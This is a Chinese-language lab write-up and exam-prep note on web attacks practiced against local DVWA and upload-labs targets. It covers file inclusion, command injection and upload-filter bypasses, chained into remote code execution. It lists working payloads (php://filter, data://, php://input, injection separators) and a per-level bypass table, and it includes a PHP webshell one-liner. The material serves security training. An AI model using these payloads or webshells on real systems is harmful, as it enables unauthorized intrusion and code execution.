# 2026-09-16(续) CCP 实操带练：文件包含 → RCE → 上传绕过

> 状态：✅ 实操过（文件包含 DVWA 四档全通 + 命令执行四档全通 + 上传+包含=RCE 链条打通）｜🟡 上传绕过（整合表来自 upload-labs 容器源码逐关核对，标注了 4 关的**平台依赖**待换环境验证）
> 说明：本篇记"我亲手打通的路径 + 踩过的坑 + 源码级对照"（原为 CCP 考前复习总纲的配套，总纲已随 CCP 结项清理）
> 关联：[文件包含漏洞详解](./2026-08-05-文件包含漏洞详解.md) · [RCE 详解](./2026-08-05-RCE远程代码命令执行详解.md) · [文件上传漏洞](./2026-07-31-文件上传漏洞.md)

---

## 一、今晚路线（没动过的板块优先）

| 站 | 内容 | 靶场 | 结果 |
|---|---|---|---|
| 1 | 文件包含（含任意文件读取） | DVWA → File Inclusion，四档 low/medium/high/impossible | ✅ 四档全通 |
| 2 | 概念收口：任意文件读取 vs 文件包含 | 口述 | ✅ 已能区分 |
| 3 | 命令执行（RCE 的"命令执行"侧） | DVWA → Command Injection，四档 | ✅ 四档全通 |
| 4 | 上传绕过 + 串链（上传+包含=RCE） | upload-labs 源码核对 + DVWA 图片马 | ✅ 链条打通 |

环境：DVWA `http://127.0.0.1:8080`（admin/password）、upload-labs `http://127.0.0.1:8083`（Docker Desktop，容器 dvwa / upload-labs）

---

## 二、第 1 站 · 文件包含（DVWA）

### 2.1 我打通的顺序（从"读文件"到"执行代码"）

| 步骤 | 我做的事 | 现象 |
|---|---|---|
| 1 | `?page=///etc/passwd`（绝对路径） | 直接读出 `root:x:0:0:` ✅ → 说明**服务端零过滤** |
| 2 | `?page=file1.php` | 只显示那句话 → `include` 是**执行**，看到的不是源码 |
| 3 | `?page=index.php` | 空白（相对基准在 `vulnerabilities/fi/` → 包含了自己 → 递归） |
| 4 | `?page=../../index.php` | **一直转圈**（包含到"会执行/会重定向的应用入口"，等于页面里又跑一遍 DVWA） |
| 5 | `?page=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php` | 拿到 Base64 → Decoder 解码 = **源码** ✅ |
| 6 | 同法读 `/var/www/html/config/config.inc.php` | 拿到**数据库账号密码**（文件包含的第一价值：读配置拿凭据） |
| 7 | `?page=php://filter/resource=/etc/passwd`（故意不加编码） | 输出**未编码**原文（passwd 里没 `<?php` 所以当文本输出） |
| 8 | `?page=php://filter/resource=index.php`（不加编码） | **被当 PHP 执行，出现两个主页** ⭐ 反证"必须 base64" |
| 9 | medium：`///etc/passwd` 原样发 | **照样通**（过滤删的是 `../`，我的绝对路径不需要它） |
| 10 | medium：`....//....//....//....//....//etc/passwd` | `str_replace` 删一次后剩 `../`×5 → 读到 passwd ✅ |
| 11 | high：`?page=file:///etc/passwd` | 通（`fnmatch("file*")` 只校验字符串前缀，`file://` 前缀命中） |

### 2.2 四档对照表（**这张表是考试写作答模板**）

| 档 | 检测逻辑（源码） | 绕过手段 | 本质缺陷 |
|---|---|---|---|
| low | `$file = $_GET['page'];` 直接 `include` | 绝对路径 / 任意路径穿越 | 零校验 |
| medium | `str_replace` 删 `http://` `https://` `../` `..\` | ① 绝对路径 ② **双写 `....//`**（删一次后仍剩 `../`） ③ `hthttp://tp://` | 黑名单只删"字面拼写"，且**只替换一次** |
| high | `fnmatch("file*",$file)` 只放行 `file` 开头 | `file:///etc/passwd`（`file` 是**包装器名**，不是文件名） | **校验看字符串前缀，使用看解析后的资源** |
| impossible | 只允许 `include.php` / `file1.php` / `file2.php` / `file3.php` | 打不动（正解） | —— 白名单固定值映射 |

**必背 payload（默写级）**：
```
php://filter/read=convert.base64-encode/resource=<绝对路径>   ← 读源码
data://text/plain,<?php system('id');?>                       ← 直接执行（需 allow_url_include=On）
php://input  + POST 体里写 PHP 代码                            ← 无文件执行
file:///etc/passwd                                            ← 绕 fnmatch("file*") 这类前缀白名单
```

### 2.3 高中低三种"读不了"的排错口诀（**今天最有价值的一条**）

| 现象 | 含义 |
|---|---|
| 页面空白 | include 失败（路径不存在/无权限）**或**文件被执行但没输出 |
| **HTTP 500** | ⭐ include **成功且被执行了**，但代码有语法/致命错误 → 路径对、内容错 |
| 页面出现"另一个主页" | 包含到的是"会执行的应用入口"（递归/重定向） |
| 一串 Base64 | 走的是 `php://filter` + 编码 → **成功读到源码** |

---

## 三、第 3 站 · 命令执行（DVWA Command Injection）

### 3.1 四档对照

| 档 | 检测逻辑（源码） | 我的绕过 | 关键认知 |
|---|---|---|---|
| low | 无过滤，`shell_exec('ping -c 4 '.$_REQUEST['ip'])` | `127.0.0.1; whoami` | 拼接符直接接命令 |
| medium | `str_replace` 删 `&&` `;` | 用**没被删的** `\|` 或 `&` | 黑名单防的是"我预想的写法" |
| high | 删 `&` `;` `\| `(**带空格**) `-` `$` `(` `)` `` ` `` `\|\|` | `127.0.0.1\| \|whoami` → 删掉 `\| ` 后剩下 `\|whoami` | 又是**双写**：让被过滤的形态只占输入的一部分 |
| impossible | `explode('.')` 拆 4 段 → 每段 `is_numeric` → `sizeof==4` → **用拆出来的段重新拼 `$target`** 再进 shell | 打不动 | ① 结构白名单 ② ⭐ **校验后重新构造值**（绝不拿用户原始串去用） |

> impossible 档**连 `escapeshellarg` 都没用**，照样安全 —— 说明防命令注入的正解不是"转义得更好"，而是"**不让用户输入以代码形态进 shell**"。

### 3.2 必背

**拼接符**：Linux `;` `|` `||` `&&` `&` `` `cmd` `` `$(cmd)`｜Windows `&` `&&` `||` `|`
**无回显三条路**：① 写文件到 Web 目录再从浏览器取 ② 盲时间（`sleep` / 按字符二分） ③ 带外 OOB（`curl` 回连自己、DNS 外带）

---

## 四、第 4 站 · 上传绕过整合（upload-labs 源码级对照）

> 以下"检测逻辑"一列是我从容器 `/var/www/html/Pass-XX/index.php` **逐关读源码核对**的，不是抄 writeup。

### 4.1 关卡 × 检测 × 绕过

| 关卡 | 检测逻辑（源码要点） | 绕过手段 | 平台/前提 |
|---|---|---|---|
| Pass-01 | 前端 JS：`allow_ext=".jpg\|.png\|.gif"` | 关 JS / Burp 改包直发 `.php` | 前端不可信 |
| Pass-02 | `$_FILES['type'] == image/jpeg\|png\|gif` | 改 `Content-Type: image/jpeg`，文件名保持 `.php` | 客户端提交的 MIME |
| Pass-03 | 黑名单仅 `.asp .aspx .php .jsp` | 换等价后缀 **`.php5` `.php3` `.phtml` `.pht`** | 中间件要认识该后缀 |
| Pass-04 | 超长黑名单（含 `.php5/.phtml/.pht/大小写变体`），**未禁 `.htaccess`** | 传 **`.htaccess`** 改解析规则，再传 `.jpg` 马 | Apache + AllowOverride |
| Pass-05 | 黑名单 + 加了 `.htaccess`，**未禁 `.user.ini`** | 传 **`.user.ini`**（`auto_prepend_file=x.jpg`） | PHP-CGI/FPM 模式 |
| Pass-06 | 名单同 05，但**文件名没 `trim`、`$file_ext` 也没收尾去空** | 文件名尾部加**空格** `shell.php `（名单比对的是 `.php `） | ⚠️ **Windows 特性**（尾空格被吃掉）→ Linux 容器按原意打不通 |
| Pass-07 | 有 `trim`，但**没有 `deldot`** | 文件名尾部加**点** `shell.php.` | ⚠️ **Windows 特性**（尾点被吃掉） |
| Pass-08 | 有 `deldot`，**但没有去 `::$DATA`** | `shell.php::$DATA` | ⚠️ **Windows NTFS** ADS 特性 |
| Pass-09 | 归一化最全（`trim`+`deldot`+`strtolower`+去 `::$DATA`+`trim(ext)`） | 空格/点组合形态（`shell.php .`） | ⚠️ 仍依赖 Windows 规范化 |
| Pass-10 | `str_ireplace($deny_ext, "", $file_name)` 删**文件名里的**名单后缀 | ⭐ **双写** `shell.pphphp` → 删一次剩 `shell.php` | 单次替换非递归 |
| Pass-11 | 后缀白名单 jpg/png/gif + `save_path` 来自 **GET** | **`%00` 截断**（`save_path=.../shell.php%00`） | 旧版本 PHP（<5.3.4） |
| Pass-12 | 同 11，但 `save_path` 来自 **POST** | `%00` 截断（POST 需注意编码层数） | 同上 |
| Pass-13 | `getReailFileType()` **只读前 2 字节**判断类型（255216=jpg / 13780=png / 7173=gif），并按该类型**重命名** | 加文件头（`GIF89a`/真图 + PHP 代码）→ 上传成功但后缀是图片 → **需配合文件包含执行** | 检测只看头部，PHP 看整文件 |
| Pass-14 | `getimagesize()` 校验 | **图片马** + 文件包含 | 同上 |
| Pass-15 | `exif_imagetype()` 校验 | 图片马（可在 EXIF 段写代码） | 同上 |
| Pass-16 | `imagecreatefromjpeg()` + `imagejpeg()` **二次渲染后存盘** | 在"重绘后仍保留的字节段"植入代码（对比原图/渲染图找差异区） | 重绘不保全部字节 |
| Pass-17 | ⭐ **先 `move_uploaded_file` 落盘（用原始文件名）**，**之后**才 `in_array` 校验后缀，不合规 `unlink` | **条件竞争**：并发上传 + 高频访问，抢在 `unlink` 之前执行 | 竞态窗口 |
| Pass-18 | `MyUpload` 类：同样**先落盘再检查/重命名** | 条件竞争（重命名前访问） | 同上 |
| Pass-19 | `save_name` 参数可控 + `pathinfo(PATHINFO_EXTENSION)`；**源码里原本的 `trim/deldot/::$DATA` 处理被注释掉了** | 尾点/尾空形态（`shell.php.`）+ `save_name` 可控 | ⚠️ Windows 规范化 |
| Pass-20 | `$_FILES['type']` 白名单 + `explode('.')` + **`end()` 取最后一段**校验后 `reset()` 拼文件名 | ⭐ **`save_name` 传数组**（`save_name[]=shell.php&save_name[]=1.jpg`）→ `is_array()` 短路跳过 `explode`，`end()` 拿到 `1.jpg` 过白名单、落盘却是 **`shell.php.1.jpg`** | 需 **Apache AddHandler 多后缀解析**（Debian 的 `FilesMatch` 正则会挡住） |

### 4.2 通用绕过阶梯（不依赖具体靶场，考试就用这个顺序试）

```
① 前端校验      → 关 JS / 抓包改包直发
② MIME          → 改 Content-Type: image/jpeg
③ 黑名单（不全） → .php3 .php4 .php5 .php7 .phtml .pht .phps（看中间件解析白名单）
④ 黑名单（归一化不全）→ 尾空格 / 尾点 / ::$DATA / 大小写 / 双写
⑤ 白名单        → 解析漏洞（Apache 多后缀·AddHandler；Nginx fix_pathinfo；IIS6 ; 与目录解析；IIS7 FastCGI）
                  / .htaccess / .user.ini 改规则 / %00 截断（旧 PHP）
⑥ 内容检测      → 图片马（真图 + 尾部 PHP、GIF89a + PHP、EXIF 里写）
⑦ 二次渲染      → 找重绘后仍保留的字节段
⑧ 先落盘后校验  → 条件竞争（上传 + 并发访问）
⑨ 参数可控      → save_name / save_path 白名单校验值 ≠ 落盘值（含数组短路）
⑩ 打不动        → 换思路（存 Web 根外 + 随机重命名 + 禁解析目录 = 正解）
```

### 4.3 必背的两个判定信号

1. **验收标准**：`上传成功`（写盘）**≠** `可利用`（执行）。危害 = `存储路径在不在 Web 根目录` × `后缀在不在解析白名单`。（云帆靶场沉淀）
2. **判断"被解析"而不是"被下载"**：响应头 `Content-Type: text/html` + `Set-Cookie: JSESSIONID` = 被 JSP 引擎编译；`text/plain` / `application/octet-stream` + `Last-Modified` = 静态资源。

---

## 五、串链：上传 + 包含 = RCE（今天亲手打通的）

```
① 传一个"内容是 PHP、后缀是图片"的文件（图片马）
      GIF89a
      <?php system($_GET['c']); ?>
② 记下落盘路径（DVWA：/var/www/html/hackable/uploads/<文件名>）
③ 用文件包含去"包含"它（high 档要 file:// 前缀才过 fnmatch）：
      /vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/<文件名>&c=id
④ 看到 uid=0(root) ⇒ RCE
```

**三个前提（考试写报告就写这三条）**：内容含可执行代码 × 落盘在 Web 可访问路径 × 存在文件包含点。

---

## 六、今天踩的坑（都是真踩过的，值得单列）

1. `../` 层数**不是**按浏览器 URL 数，基准是"执行 `include` 那句代码的脚本所在目录" → 数不清就用**饱和穿越（10 层）或绝对路径**
2. `include` 一个"会执行/会重定向的入口文件"（如根 `index.php`）→ **递归/一直转圈**，不能用来"看源码"
3. `php://filter/resource=x` **不加** `convert.base64-encode` ≈ 普通 `include`（PHP 代码照样被执行）
4. 一句话木马语法：`system=$GET['c']` / `system=($_GET['c'])` **都是错的** —— `=` 是赋值（左边必须是变量），函数调用**不写等号**；`$_GET` 有下划线
5. URL 里**只能有一个 `?`**，后续参数用 `&`（`$_GET` 是"整个请求共享的参数表"，被包含的文件也能取到 `c`）
6. `file://` 读 PHP 文件会**空白**（被执行且没有 echo）；读 `passwd` 有内容 → 再次证明"必须 base64 才能看源码"
7. 上传后 500 = 路径对、代码写错；空白 = 路径/权限错 → **判定口诀**
8. upload-labs 的**尾空格/尾点/`::$DATA`** 几关是 **Windows 特性**，Linux 容器里按原意打不通 → **绕过手段依赖"校验层 vs 解析层"的环境差异**

---

## 待实践

- [ ] upload-labs 那 5 关平台依赖关（Pass-06/07/08/09/19/20）在 **Windows + phpStudy** 环境各打一遍，验证"Windows 规范化"到底怎么吃掉尾空格/尾点/`::$DATA`
- [ ] `data://` 与 `php://input` 两种"无文件执行"在 DVWA 上亲手各打一次（今天只看我给的 payload 说明）
- [ ] 日志投毒（UA 写 PHP → 包含 access.log）：本次环境已放开日志读权限，值得亲手走一遍
- [ ] 条件竞争（Pass-17/18）写一个并发脚本练手感（**自己写**）
- [ ] 把这些 payload 归类沉淀进「工具速查/2-爆破与注入.md 或 3-提权.md 的文件上传与 getshell 分组」

## 关联笔记

- [文件包含漏洞详解](./2026-08-05-文件包含漏洞详解.md) · [RCE 远程代码命令执行详解](./2026-08-05-RCE远程代码命令执行详解.md) · [文件上传漏洞](./2026-07-31-文件上传漏洞.md)
- 实战参照：`Desktop/靶场练习/云帆文件管理系统-文件上传安全评估.md`（Spring Boot + JSP 上传 getshell 报告范式）

> ⚠️ 声明：以上技术仅用于**授权环境**（本地靶场 / 授权渗透测试）。DVWA、upload-labs 均为本地授权靶场。
